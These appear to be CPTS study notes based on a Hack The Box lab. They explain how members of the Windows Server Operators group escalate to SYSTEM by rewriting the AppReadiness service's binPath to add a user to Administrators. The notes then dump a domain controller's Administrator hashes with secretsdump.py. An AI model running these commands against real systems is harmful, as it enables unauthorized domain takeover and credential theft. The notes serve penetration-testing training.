This is another **high-value Windows privilege-escalation group** for CPTS.

The core idea is:

```text
Server Operators
      ↓
SeBackupPrivilege + SeRestorePrivilege
      +
Control local services
      ↓
Control a SYSTEM service
      ↓
Modify service configuration
      ↓
Execute a command as SYSTEM
      ↓
Local Administrator
```

The source demonstrates this through the `AppReadiness` service.

---

# 1. What is Server Operators?

The **Server Operators** group allows members to administer Windows servers without requiring Domain Admin membership.

The source identifies three particularly important capabilities:

- Local logon to servers, including Domain Controllers
    
- `SeBackupPrivilege`
    
- `SeRestorePrivilege`
    
- Ability to control local services
    

So when you discover:

```text
Server Operators
```

during enumeration, immediately investigate:

```text
whoami /priv
```

and the permissions on interesting services.

---

# 2. Why Service Control Matters

The most important part of this section is **service control**.

A Windows service can run under a highly privileged account such as:

```text
NT AUTHORITY\SYSTEM
```

If you can control the service's configuration, you may be able to make that SYSTEM service execute something of your choosing.

The mental model:

```text
Low-privileged user
       │
       ▼
Server Operators
       │
       ▼
Full control over certain service
       │
       ▼
Service runs as SYSTEM
       │
       ▼
Modify service executable/command
       │
       ▼
Start service
       │
       ▼
Command executes as SYSTEM
```

---

# 3. Examine AppReadiness

The source uses:

```text
AppReadiness
```

First check its configuration:

```cmd
sc qc AppReadiness
```

Important output:

```text
SERVICE_NAME: AppReadiness
TYPE               : 20  WIN32_SHARE_PROCESS
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
SERVICE_START_NAME : LocalSystem
```

The critical line is:

```text
SERVICE_START_NAME : LocalSystem
```

That tells us the service runs under:

```text
NT AUTHORITY\SYSTEM
```

### CPTS thought process

When enumerating services, ask:

```text
Who does the service run as?
        ↓
SYSTEM?
        ↓
Who can control the service?
        ↓
Can I modify its configuration?
```

---

# 4. Check Service Permissions

The source uses Microsoft's Sysinternals tool:

```text
PsService
```

Command:

```cmd
C:\Tools\PsService.exe security AppReadiness
```

The output shows:

```text
[ALLOW] BUILTIN\Server Operators
        All
```

This is the important line.

It means Server Operators have:

```text
SERVICE_ALL_ACCESS
```

against this service.

So we have:

```text
Server Operators
       ↓
SERVICE_ALL_ACCESS
       ↓
AppReadiness
       ↓
LocalSystem
```

That combination is extremely interesting for privilege escalation.

---

# 5. `sc.exe` vs `PsService`

You've already seen:

```cmd
sc.exe
```

in your Windows Fundamentals material.

`PsService` provides similar functionality but gives additional service-management capabilities and service security information.

The source describes it as being able to:

- Display service status
    
- Display configuration
    
- Start services
    
- Stop services
    
- Pause services
    
- Resume services
    
- Restart services
    
- Work against remote hosts
    

So for enumeration:

```cmd
sc qc <service>
```

is useful for configuration.

And:

```cmd
PsService.exe security <service>
```

is useful for examining permissions.

---

# 6. Check Local Administrators

Before modifying anything, the source checks whether the target account is already an administrator:

```cmd
net localgroup Administrators
```

Output:

```text
Administrator
Domain Admins
Enterprise Admins
```

The target:

```text
server_adm
```

is not present.

This establishes the starting condition:

```text
server_adm
     ↓
NOT local Administrator
```

---

# 7. Modify the Service Binary Path

This is the critical step in the lab.

The source changes the service's binary path:

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Output:

```text
[SC] ChangeServiceConfig SUCCESS
```

The command changes what the service will execute.

Conceptually:

```text
Before:

AppReadiness
     ↓
svchost.exe -k AppReadiness
     ↓
SYSTEM


After:

AppReadiness
     ↓
cmd /c ...
     ↓
SYSTEM
```

The crucial factor is that **AppReadiness runs as LocalSystem**.

---

# 8. Starting the Service

The source then runs:

```cmd
sc start AppReadiness
```

It returns:

```text
[SC] StartService FAILED 1053:

The service did not respond to the start or control request
in a timely fashion.
```

At first glance, this looks like the attack failed.

But the important lesson is:

> **A service-start error does not necessarily mean the configured command didn't execute.**

The configured command can execute and then terminate in a way that doesn't satisfy the service-control manager's expectations.

---

# 9. Check Administrators Again

Run:

```cmd
net localgroup Administrators
```

The source now shows:

```text
Administrator
Domain Admins
Enterprise Admins
server_adm
```

So:

```text
server_adm
      ↓
Local Administrators
```

The command executed successfully despite the service reporting error `1053`.

---

# 🔥 The Important Privilege Escalation Chain

This is the part you should memorize:

```text
                 Server Operators
                        │
                        ▼
              Service control rights
                        │
                        ▼
                 AppReadiness
                        │
                        ▼
                Runs as LocalSystem
                        │
                        ▼
             Modify service command
                        │
                        ▼
                   Start service
                        │
                        ▼
              Command executes as SYSTEM
                        │
                        ▼
             Add user to Administrators
                        │
                        ▼
              Local Administrator
```

---

# 10. Why `SeRestorePrivilege` Is Interesting

Server Operators also receive:

```text
SeBackupPrivilege
SeRestorePrivilege
```

You already studied `SeBackupPrivilege` in the **Backup Operators** section.

### SeBackupPrivilege

Can allow special backup-style access to files that the user normally couldn't read.

### SeRestorePrivilege

Can allow restoring/writing objects in ways that bypass some normal access checks.

Therefore, Server Operators aren't interesting **only** because of services.

You should investigate:

```cmd
whoami /priv
```

for both:

```text
SeBackupPrivilege
SeRestorePrivilege
```

---

# 11. Domain Controller Impact

The source then demonstrates checking access to the Domain Controller using:

```text
crackmapexec
```

The important result is:

```text
Pwn3d!
```

The significance is that `server_adm` now has administrative access to the Domain Controller.

From there, the source demonstrates retrieving domain credential material.

---

# 12. Retrieving NTLM Hashes

The source uses:

```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

The output contains:

```text
Administrator:500:...:cf3a5525ee9414229e66279623ed5c58:::
```

and Kerberos keys:

```text
Administrator:aes256-cts-hmac-sha1-96:...
Administrator:aes128-cts-hmac-sha1-96:...
Administrator:des-cbc-md5:...
```

The important CPTS concept is:

```text
Local Administrator on DC
          ↓
Administrative control
          ↓
Domain credential access
          ↓
NTDS credential material
```

---

# 🧠 Important Distinction: Local Admin vs Domain Admin

This is a really important AD concept.

Adding:

```text
server_adm
```

to:

```text
Administrators
```

means **local Administrators on that machine**.

But because the machine in this scenario is a **Domain Controller**, local administrative control is extremely powerful.

A Domain Controller's security boundary is fundamentally different from a normal workstation.

So:

```text
Local Admin on workstation
        ≠
Local Admin on Domain Controller
```

On a DC, administrative control can lead to control over the domain itself.

---

# 13. CPTS Enumeration Workflow

When you get a shell as a potentially interesting account:

### Step 1 — Check identity

```cmd
whoami
```

### Step 2 — Check privileges

```cmd
whoami /priv
```

Look for:

```text
SeBackupPrivilege
SeRestorePrivilege
```

### Step 3 — Check groups

```cmd
whoami /groups
```

Look for:

```text
Server Operators
```

### Step 4 — Enumerate services

```cmd
sc query
```

### Step 5 — Inspect interesting service

```cmd
sc qc AppReadiness
```

### Step 6 — Check service permissions

```cmd
PsService.exe security AppReadiness
```

### Step 7 — Determine service account

Look for:

```text
SERVICE_START_NAME : LocalSystem
```

### Step 8 — Determine whether your group has control

Look for:

```text
BUILTIN\Server Operators
    All
```

That gives you the critical combination:

```text
YOU
 ↓
Server Operators
 ↓
Service All Access
 ↓
SYSTEM service
```

---

# 🔥 CPTS Must-Know Commands

### Check privileges

```cmd
whoami /priv
```

### Check groups

```cmd
whoami /groups
```

### Check local Administrators

```cmd
net localgroup Administrators
```

### Query service configuration

```cmd
sc qc AppReadiness
```

### Check service permissions

```cmd
PsService.exe security AppReadiness
```

### Modify service configuration

```cmd
sc config AppReadiness binPath= "..."
```

### Start service

```cmd
sc start AppReadiness
```

### Check service

```cmd
sc query AppReadiness
```

---

# ⚠️ The CPTS Trap: Service Start Failure

This is worth remembering because it's easy to misinterpret.

You may see:

```text
StartService FAILED 1053
```

and immediately think:

> "My command didn't execute."

But in the HTB example, the command **did execute** and the user was added to Administrators.

Therefore:

```text
Service error
      ≠
Command necessarily failed
```

Always verify the intended state afterward:

```cmd
net localgroup Administrators
```

---

# 🧩 Compare Server Operators With What You've Learned

|Group|Main escalation idea|
|---|---|
|**Backup Operators**|`SeBackupPrivilege` → protected files / `NTDS.dit`|
|**Event Log Readers**|Event-log information|
|**DnsAdmins**|DNS plugin → SYSTEM|
|**Hyper-V Administrators**|VM/disk control → potentially domain credentials|
|**Print Operators**|`SeLoadDriverPrivilege` → vulnerable driver|
|**Server Operators**|Service control + backup/restore privileges|

The pattern you're learning is:

```text
Built-in group
      ↓
Special privilege
      ↓
Find object/service/resource
      ↓
Determine effective permissions
      ↓
Find escalation path
```

---

# 🎯 Final Mental Model

For **Server Operators**, remember:

> **Server Operators + controllable SYSTEM service = investigate service-based privilege escalation.**

The HTB scenario is:

```text
Server Operators
       │
       ├── SeBackupPrivilege
       │
       ├── SeRestorePrivilege
       │
       └── Service control
              │
              ▼
         AppReadiness
              │
              ▼
        LocalSystem
              │
              ▼
       Modify binPath
              │
              ▼
         Start service
              │
              ▼
       Command execution
              │
              ▼
       Local Administrator
              │
              ▼
        Domain Controller
              │
              ▼
      Domain credential access
```

**CPTS golden rule:** when you see **Server Operators**, don't stop at `whoami /priv`. **Enumerate services and inspect their security descriptors/permissions.** The combination of _who controls the service_ + _which account the service runs as_ is what reveals the escalation path.